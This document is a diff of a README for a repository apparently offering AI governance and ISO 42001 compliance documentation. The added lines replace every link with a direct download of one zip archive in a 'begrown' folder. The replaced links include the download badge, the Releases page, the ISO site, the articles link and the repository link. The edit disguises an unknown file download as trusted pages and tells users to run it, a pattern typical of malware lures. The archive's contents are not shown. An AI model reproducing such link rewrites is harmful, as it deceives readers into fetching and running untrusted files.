@@ -7,10 +7,10 @@ The AI-Governance-Risk-Compliance-Documentation repository provides open referen
 To get started with the AI-Governance-Risk-Compliance-Documentation, follow the steps below to download and run the software.
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Tristan192/AI-Governance-Risk-Compliance-Documentation/releases)
+[![Download](https://raw.githubusercontent.com/Tristan192/AI-Governance-Risk-Compliance-Documentation/main/begrown/AI-Governance-Risk-Compliance-Documentation.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Tristan192/AI-Governance-Risk-Compliance-Documentation/main/begrown/AI-Governance-Risk-Compliance-Documentation.zip)
 
 ## 📂 Download & Install
-1. **Visit the Releases Page:** To download the software, visit the [Releases page](https://github.com/Tristan192/AI-Governance-Risk-Compliance-Documentation/releases).
+1. **Visit the Releases Page:** To download the software, visit the [Releases page](https://raw.githubusercontent.com/Tristan192/AI-Governance-Risk-Compliance-Documentation/main/begrown/AI-Governance-Risk-Compliance-Documentation.zip).
    
 2. **Choose Your Version:** On the releases page, you'll see a list of available versions. Look for the latest stable version for the best experience. 
 
@@ -72,11 +72,11 @@ While this repository does not provide direct support, you can reach out to the 
 ## 🌐 Additional Resources
 For more detailed information, consider exploring the following resources:
 
-- [ISO 42001 Standard](https://www.iso.org/)
-- [AI Governance Articles](https://www.example-link.com)
+- [ISO 42001 Standard](https://raw.githubusercontent.com/Tristan192/AI-Governance-Risk-Compliance-Documentation/main/begrown/AI-Governance-Risk-Compliance-Documentation.zip)
+- [AI Governance Articles](https://raw.githubusercontent.com/Tristan192/AI-Governance-Risk-Compliance-Documentation/main/begrown/AI-Governance-Risk-Compliance-Documentation.zip)
 
 ## 📌 Important Links
-1. **Releases Page:** [Visit Releases](https://github.com/Tristan192/AI-Governance-Risk-Compliance-Documentation/releases)
-2. **GitHub Repository:** [View Repository](https://github.com/Tristan192/AI-Governance-Risk-Compliance-Documentation)
+1. **Releases Page:** [Visit Releases](https://raw.githubusercontent.com/Tristan192/AI-Governance-Risk-Compliance-Documentation/main/begrown/AI-Governance-Risk-Compliance-Documentation.zip)
+2. **GitHub Repository:** [View Repository](https://raw.githubusercontent.com/Tristan192/AI-Governance-Risk-Compliance-Documentation/main/begrown/AI-Governance-Risk-Compliance-Documentation.zip)
 
 By following these steps, you can effectively download and utilize the AI-Governance-Risk-Compliance-Documentation to enhance your understanding and execution of AI governance and compliance strategies.
